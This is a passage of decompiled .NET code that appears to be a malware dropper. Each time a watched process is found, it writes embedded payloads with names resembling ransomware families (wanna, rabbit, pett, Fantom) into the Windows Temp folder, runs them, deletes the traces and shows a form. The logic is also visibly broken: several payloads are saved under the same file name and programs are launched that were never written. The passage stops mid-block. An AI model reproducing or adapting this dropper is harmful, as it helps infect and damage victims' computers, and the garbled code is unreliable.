			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName29.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName30.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName31.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName32.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName33.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName34.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName35.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName36.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName37.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
